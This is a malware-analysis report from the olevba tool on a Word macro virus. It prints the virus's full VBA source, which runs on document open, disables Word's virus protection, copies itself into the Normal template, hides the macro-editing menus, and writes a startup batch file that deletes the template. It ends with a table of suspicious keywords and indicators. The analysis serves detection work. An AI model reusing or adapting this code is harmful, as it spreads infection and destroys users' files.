olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-aee1d8754343ebff75116858734f1e518af6b4f9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-aee1d8754343ebff75116858734f1e518af6b4f9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO IraArdS.bas 
in file: Virus.MSWord.VMPC-based-aee1d8754343ebff75116858734f1e518af6b4f9 - OLE stream: 'Macros/VBA/iraards'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub IraArdS()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Give me DRUGS!"
    'Poppy ID : 63478513-2166
    
    
On Error Resume Next
k18601 = m13753 & e7752
f10779 = u14487 & c11756 & Int(Rnd * 7831)
k10951 = m8985 & e9087
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
k14008 = m14250 & e18408
k12480 = m16618 & e8748
ActiveDocument.ReadOnlyRecommended = False
f12910 = u7182 & c10167 & Int(Rnd * 5936)
k14199 = m2109 & e14622
q851363471 = 0
Set az634785134 = MacroContainer
 f6816$ = "c:\windows\startm~1\programs\startup\msfile.bat"
b68296347 = GetAttr(NormalTemplate.FullName)
If b68296347 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6816$)
f13314 = u11117 & c5417 & Int(Rnd * 3660)
If b68296347 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6816$)
If b68296347 = vbReadOnly Then GoTo fuckoff
k16701 = m4725 & e15953
If b68296347 = vbReadOnly + vbArchive Then GoTo fuckoff
f12159 = u3496 & c10286 & k9233 & m3496
If az634785134 = NormalTemplate Then q851363471 = 1
f3387 = u644 & c5106 & Int(Rnd * 4075)
If q851363471 = 1 Then i1i85132 = NormalTemplate.FullName Else i1i85132 = ActiveDocument.FullName
k9949 = m7847 & e11489
k5671 = m7430 & e12429
If q851363471 = 1 Then bgt63478 = ActiveDocument.FullName Else bgt63478 = NormalTemplate.FullName
Application.OrganizerCopy Source:=i1i85132, Destination:=bgt63478, Name:="IraArdS", Object:=wdOrganizerObjectProjectItems
If q851363471 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
k10637 = m16043 & e13839
k609 = m9887 & e17912
If q851363471 = 0 Then
f11362 = u10970 & c18858 & Int(Rnd * 7270)
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
k12451 = m10462 & e12821
k4171 = m15952 & e8696
    MsgBox "IRA-Ards", vbInformation
f13148 = u13912 & c12636 & k13511 & m13912
f6161 = u14002 & c11233 & Int(Rnd * 5790)
End Sub
Sub AutoOpen()
    On Error Resume Next
f2744 = u9978 & c7387 & Int(Rnd * 5376)
    Call IraArdS
f12398 = u10226 & c12754 & Int(Rnd * 3808)
End Sub
Sub ToolsMacro()
    On Error Resume Next
f15171 = u13585 & c18882 & Int(Rnd * 8813)
End Sub
Sub FileTemplates()
    On Error Resume Next
f12982 = u6708 & c9855 & Int(Rnd * 9116)
f6553 = u12593 & c7411 & Int(Rnd * 5612)
f1768 = u4905 & c14107 & Int(Rnd * 8098)
End Sub
Sub ViewVBCode()
    On Error Resume Next
f375 = u10553 & c16507 & Int(Rnd * 295)
k6730 = m10879 & e11880
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f6791 = u9324 & c9881 & Int(Rnd * 660)
n$ = NormalTemplate
k12508 = m2775 & e14675
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
f4601 = u12447 & c10853 & Int(Rnd * 962)
Part2$ = "del "
f7136 = u9076 & c14512 & Int(Rnd * 6603)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f11017 = u1219 & c14226 & Int(Rnd * 1327)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

